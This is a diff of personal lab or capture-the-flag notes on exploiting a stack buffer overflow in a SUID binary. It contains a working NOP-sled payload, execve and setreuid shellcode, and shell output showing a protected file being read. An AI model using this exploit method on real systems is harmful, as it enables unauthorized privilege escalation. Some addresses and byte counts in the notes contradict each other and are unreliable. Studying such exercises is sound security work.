@@ -530,9 +530,9 @@ What this does is it fills buffer to limit 14 then fills the location of the var
 
 # Task 8 Buffer Overflow
 
-Simple explanation of this challenge
+This should have similarity to the Task 7. 
+First off this is the code we will be working with:
 
-First of this is the code we will be working with:
 ```
 [...overflow-3]$ cat buffer-overflow.c
 #include <stdio.h>
@@ -552,26 +552,28 @@ int main(int argc, char **argv)
     copy_arg(argv[1]);
 }
 ```
+
+## What the aim is here:
 - The goal is to read the secret.txt file
 - The program buffer-overflow has suid bit set.
 - When any user runs this program, it executes with the permissions of the file’s owner (user2). So user1 temporarily becomes user2 for the duration of program.
 - Idea is to spawn a shell within program t allow secret.txt file to read.
 
+Note the suid bit on bufferoverflow with user2 ownership.
 ```
-[user1@ip-10-49-146-85 overflow-3]$ ls -la
-total 20
-drwxrwxr-x 2 user1 user1   72 Sep  2  2019 .
-drwx------ 7 user1 user1  169 Nov 27  2019 ..
+overflow-3]$ ls -la
+...
 -rwsrwxr-x 1 user2 user2 8264 Sep  2  2019 buffer-overflow
 -rw-rw-r-- 1 user1 user1  285 Sep  2  2019 buffer-overflow.c
 -rw------- 1 user2 user2   22 Sep  2  2019 secret.txt
-[user1@ip-10-49-146-85 overflow-3]$ 
-
 ```
 
 Key points:
 - buffer is 140 bytes.
 - strcpy(buffer, string) copies without length checking.
+- main method has 2 arguments int argc and char **argv.
+- These will be stored on stack and it wont necessessarily be in order they follow in code. So will need to determine space after the variable we use in over flow.
+
 
 If argv[1] is longer than 140 bytes, you:
 - overflow buffer
@@ -641,6 +643,8 @@ You might structure it like this:
 ```
 
 - That totals roughly 140 + 8 bytes (8 is the overflow).
+- What this fails to mention is the buffer variable is in the copy_arg stack for the buffer-overflow program when run. Buffer overflow might with something before or after it. And the difference needs to be determined thats why 148 bytes here will fail. But the buffer location will be used to start the buffer overflow. 
+- Total length of code used to overflow needs to account buffer length + filler to reach saved RBP + address of buffer (little-endian).
 - The NOP sled doesn’t have to fill the entire buffer — it just needs to be large enough to absorb small address misalignments. 
 - The junk code can be anything and the overwritten part is the address that leads to somewhere in the nop sled that leads to the shell code
 - Where our shell code for this example used is a bash shell in hex:
@@ -654,6 +658,9 @@ Here is form first:
 ```
 python -c "print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)"
 ```
+- Where  random_data component = offset_to_saved_rip - len(shellcode) - len(NOPs
+- offset_to_saved_rip = (saved_RIP_address - buffer_start_address)
+
 What it should resemble:
 ```
 python -c 'print(
@@ -768,11 +775,35 @@ hit breakpoint at: 400527
 Get the actual stack addresses of locals:
 ```
 [0x00400527]> afvd
-arg arg1 =   : rdi : 0x7fffffffe6aa
-var var_98h = 0x7fffffffe2c8 = (qword)0x0000000000400630
-var var_90h = 0x7fffffffe2d0 = (qword)0x00007ffff7dd0400
+arg arg1 =   : rdi : 0x7fffffffe6a2
+var var_98h = 0x7fffffffe2b8 = (qword)0x0000000000400630
+var var_90h = 0x7fffffffe2c0 = (qword)0x00007ffff7dd0400
 ```
-Identify which offset is buffer:
+In this case the location of buffer is var_90h at 0x7fffffffe2c0 so thats our target address, converted to endian \xd0\xe2\xff\xff\xff\x7f\x00\x00
+
+To varify var_90h is buffer and identify which offset is buffer:
+
+Note: 
+- var_90h uses x90 space thats about 16x9=144 (yes bigger than stated in code, rest is just unused space at end)
+- sub rsp, 0xa0 is the total of stack 160 bytes
+- Saved RIP is always at rbp + 8
+- Buffer starts at RBP - buffer_size = RBP - 144
+- Offset is buffer_size + 8
+In our binary:
+- buffer_size = 144
+- saved_RBP = 8
+- saved_RIP = 8
+- Offset to RIP = 144+8 =152
+
+The payload you need should be:
+Code
+NOP sled:      100 bytes
+Shellcode:      40 bytes
+Padding:        12 bytes
+Return address:  8 bytes
+--------------------------------
+Total:         160 bytes
+  
 ```
 [0x00400527]> pdf @ sym.copy_arg
             ;-- rip:
@@ -797,10 +828,7 @@ Identify which offset is buffer:
 \u2502           0x00400562      c9             leave
 \u2514           0x00400563      c3             ret
 [0x00400527]> 
-
 ```
-- 0x00400540 is a code address (an instruction inside copy_arg).
-- buffer lives on the stack, not in the code section.
 
 The relevant lines you showed:
 
@@ -834,14 +862,45 @@ That’s the value you want to overwrite the return address with (or somewhere i
 Address: 0x7fffffffe2d0
 
 Little‑endian: d0 e2 ff ff ff 7f 00 00
-Python string: "\xd0\xe2\xff\xff\xff\x7f\x00\x00"
+Python string: "\xc0\xe2\xff\xff\xff\x7f\x00\x00"
 
-### Drop this into your payload:
+### Drop this into your payload and enter as argument to buffer-overflow script:
 ```
-python -c 'print(
-    "\x90" * 60 +
-    "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05" +
-    "A" * 58 +
-    "\xd0\xe2\xff\xff\xff\x7f\x00\x00"
-)' | ./buffer-overflow
+overflow-3]$ ./buffer-overflow $(python -c "print '\x90'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\xc0\xe2\xff\xff\xff\x7f\x00\x00'")
+Here's a program that echo's out your input
+\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdj;XH1\ufffdI\ufffd//bin/shI\ufffdAPH\ufffd\ufffdRWH\ufffd\ufffdj<XH1\ufffdAAAAAAAAAAAA\ufffd\ufffd\ufffd\ufffd\ufffd
+sh-4.2$ id                                                                     
+uid=1001(user1) gid=1001(user1) groups=1001(user1)
+sh-4.2$ cat secret.txt
+cat: secret.txt: Permission denied
+sh-4.2$ 
+```
+Shell word but the suid permissions not carried.
+-user1 tested for sudo -l and should have gone through the list of apps to find a vulnerable one but from a view of walkthroughs looks like I reached a similar point others did. So I thought I would try the pwntools options they did. What other did was to generate a prefix to our shellcode to run SETREUID, this is appended so reduce the nop sled accordingly to accomodate the new bytes.
+
+$ pwn shellcraft -f d amd64.linux.setreuid 1002
+\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
+$ python
+>>> len('\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05')
+14
+Our payload now looks like this:
+
+NOP = 86
+setreuid = 14
+shellcode = 40
+padding = 12
+Total size = 160
+
+```
+overflow-3]$ ./buffer-overflow $(python -c "print '\x90'*86 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\xc0\xe2\xff\xff\xff\x7f\x00\x00'")
+Here's a program that echo's out your input
+\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd1\ufffdf\ufffd\ufffdjqXH\ufffd\ufffdj;XH1\ufffdI\ufffd//bin/shI\ufffdAPH\ufffd\ufffdRWH\ufffd\ufffdj<XH1\ufffdAAAAAAAAAAAAAA\ufffd\ufffd\ufffd\ufffd\ufffd
+sh-4.2$ 
+sh-4.2$ id 
+uid=1002(user2) gid=1001(user1) groups=1001(user1)
+sh-4.2$ whoami
+user2
+sh-4.2$ cat secret.txt
+omgyoudidthissocool!!
+sh-4.2$ 
 ```
